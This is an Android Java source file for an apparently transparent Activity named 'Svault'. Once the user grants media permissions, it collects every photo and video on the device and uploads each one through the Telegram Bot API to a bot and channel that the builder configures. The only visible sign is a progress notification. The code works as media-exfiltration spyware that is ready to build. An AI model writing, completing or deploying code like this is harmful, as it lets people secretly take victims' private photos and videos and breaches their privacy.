package com.tenix.svault;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class inq extends Activity {

    // ── CONFIG ───────────────────────────────────────────────
    static final String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";

    // Public channel  →  @channel_username
    // Private channel →  -1001234567890   (numeric ID, bot must be admin)
    static final String CHANNEL_ID = "@your_channel_or_-100xxxxxxxxxx";
    // ────────────────────────────────────────────────────────

    private static final int    REQ_PERM = 1;
    private static final int    NOTIF_ID = 55;
    private static final String NOTIF_CH = "svault_upload";

    private NotificationManager nm;
    private ExecutorService     executor;

    // ── Lifecycle ─────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView — Activity is fully transparent (manifest theme)
        executor = Executors.newSingleThreadExecutor();
        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        initNotifChannel();
        askPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) executor.shutdown();
    }

    // ── Permissions (system dialog directly) ─────────────────

    @SuppressWarnings("NewApi")
    private void askPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] perms = {
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.POST_NOTIFICATIONS
            };
            boolean allGranted = true;
            for (String p : perms)
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false; break;
                }
            if (!allGranted) requestPermissions(perms, REQ_PERM);
            else             startUpload();

        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED)
                requestPermissions(
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
            else
                startUpload();
        } else {
            startUpload();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        if (code != REQ_PERM) return;
        for (int i = 0; i < perms.length; i++) {
            String p = perms[i];
            if (results[i] == PackageManager.PERMISSION_GRANTED
                    && (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
                     || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
                startUpload();
                return;
            }
        }
        Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
        finish();
    }

    // ── Upload logic ──────────────────────────────────────────

    private void startUpload() {
        executor.execute(() -> {
            ArrayList<Uri> all = collectMedia();
            int total = all.size();
            if (total == 0) return;
            int ok = 0;
            for (int i = 0; i < total; i++) {
                if (sendToTelegram(all.get(i))) ok++;
                pushNotif(i + 1, total);
            }
            doneNotif(ok, total);
        });
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();
        try (android.database.Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, null)) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}

        try (android.database.Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, null)) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}

        return list;
    }

    // ── Telegram API — public & private channel both work ─────

    private boolean sendToTelegram(Uri uri) {
        try {
            String mime   = getContentResolver().getType(uri);
            boolean isVid = mime != null && mime.startsWith("video");
            String method = isVid ? "sendVideo" : "sendPhoto";
            String field  = isVid ? "video"     : "photo";
            String bound  = "SVB" + System.currentTimeMillis();

            HttpURLConnection conn = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/" + method)
                    .openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30_000);
            conn.setReadTimeout(120_000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\""
                    + field + "\"; filename=\"file\"\r\n");
            out.writeBytes("Content-Type: "
                    + (mime != null ? mime : "application/octet-stream") + "\r\n\r\n");
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[8192];
                int n;
                if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();
            int code = conn.getResponseCode();
            conn.disconnect();
            return code == 200;
        } catch (Exception e) { return false; }
    }

    // ── Notifications ─────────────────────────────────────────

    private void initNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            nm.createNotificationChannel(new NotificationChannel(
                    NOTIF_CH, "Svault Upload", NotificationManager.IMPORTANCE_LOW));
    }

    @SuppressWarnings("deprecation")
    private void pushNotif(int cur, int total) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — uploading")
         .setContentText(cur + " / " + total)
         .setProgress(total, cur, false)
         .setOngoing(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void doneNotif(int ok, int total) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — complete")
         .setContentText(ok + " / " + total + " uploaded")
         .setAutoCancel(true).setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
    }
}
